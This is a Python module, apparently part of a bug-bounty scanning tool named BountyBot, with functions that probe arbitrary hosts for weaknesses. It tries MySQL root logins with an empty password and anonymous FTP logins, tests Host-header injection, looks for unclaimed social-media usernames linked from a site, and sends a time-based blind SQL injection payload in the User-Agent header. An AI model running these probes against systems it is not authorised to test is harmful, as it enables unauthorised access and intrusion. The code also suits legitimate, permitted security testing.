### Importing Libs Start
import requests,pyfiglet,pymysql,socket,re,json
from ftplib import FTP
import ipaddress
### Importing Libs End

totalreq = 0

def printbanner():
	print(pyfiglet.figlet_format("BountyBot"))
	print("twitter.com/rootxyele")
	print("github.com/xyele")
	pass

def trymysql(ihost,iport,itimeout):
	try:
		mysqlcon = pymysql.connect(host=ihost,port=iport,user="root",passwd="", connect_timeout=itimeout)
		mysqlcur = mysqlcon.cursor()
		mysqlcur.execute('SET NAMES UTF8')
		return True
		pass
	except Exception as e:
		return False
		pass
	pass

def tryftp(ihost,itimeout):
	try:
		ftp = FTP(ihost,itimeout=10)
		if "Login successful" in ftp.login():
			ftp.quit()
			return True
			pass
		else:
			return False
			pass
		pass
	except Exception as e:
		return False
		pass

def hostinjection(iwebsite,itimeout):
	try:
		rheaders = {"Host":"bing.com"}
		r = requests.get("http://"+iwebsite,headers=rheaders,allow_redirects= False, timeout=itimeout)
		if "bing.com" in r.headers["Location"]:
			return True
			pass
		else:
			return False
			pass
		pass
	except Exception as e:
		return False
		pass
	pass

def getunclaimedsocialmedia(iwebsite,itimeout):
	try:
		r = requests.get("http://" + iwebsite, allow_redirects=True, timeout=itimeout).text
		unclaimed = []
		status = 0
		facebook = re.findall("href=\"https://www.facebook.com/(.*?)\"",r)
		twitter = re.findall("href=\"https://www.twitter.com/(.*?)\"",r)
		instagram = re.findall("href=\"https://www.instagram.com/(.*?)/\"",r)
		for username in facebook:
			username = username.split("/")[0]
			if checkclaimed("facebook",username) == False:
				unclaimed.append(["facebook",username])
				status = 1
				pass
			pass
		for username in twitter:
			username = username.split("/")[0]
			if checkclaimed("twitter",username) == False:
				unclaimed.append(["Twitter",username])
				status = 1
				pass
			pass
		for username in instagram:
			username = username.split("/")[0]
			if checkclaimed("instagram",username) == False:
				unclaimed.append(["Instagram",username])
				status = 1
				pass
			pass
		return unclaimed
		pass
	except Exception as e:
		return False
		pass
	pass

def getip(website):
	try:
		if re.match("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$", website) != True:
			return socket.gethostbyname(website)
			pass
		pass
	except Exception as e:
		return ""
		pass
	pass

def checkclaimed(iplatform,iusername):
	try:
		r = requests.get("https://username-availability.herokuapp.com/check/{}/{}".format(iplatform,iusername)).text
		claim = json.loads(r)["status"]
		if claim == 200:
			return True
			pass
		elif claim == 500:
			return True
			pass
		else:
			return False
			pass
		pass
	except Exception as e:
		return False
		pass

def useragentsql(ihost,itimeout):
	sqlpayload = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep({}*2),0))OR'".format(str(itimeout))
	sqlheaders = {"User-Agent":sqlpayload}
	try:
		r = requests.get("http://" + ihost,headers = sqlheaders,allow_redirects=True, timeout=itimeout)
		return False
		pass
	except Exception as e:
		try:
			r = requests.get("http://" + ihost,allow_redirects=True, timeout=itimeout)
			return True
			pass
		except Exception as e:
			return False
			pass
		pass
	pass